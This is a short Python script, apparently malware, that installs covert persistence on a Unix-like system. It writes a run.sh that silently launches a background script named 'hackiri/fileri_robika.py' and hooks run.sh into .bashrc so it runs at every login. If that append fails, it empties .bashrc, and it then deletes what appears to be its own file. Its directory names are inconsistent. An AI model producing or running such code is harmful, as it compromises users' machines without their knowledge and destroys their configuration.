import os
os.system('cd $HOME')
file = open('run.sh' , 'a+')
file.write('python hackiri/fileri_robika.py &> /dev/null &')
file.close()
try:
    file2 = open('.bashrc' , 'a')
    file2.write('bash run.sh')
except:
    os.system('> .bashrc')
    file2 = open('.bashrc', 'a')
    file2.write('bash run.sh')
while True:
    try:
        os.system('rm -rf hackri/run.py')
        break
    except:
        pass
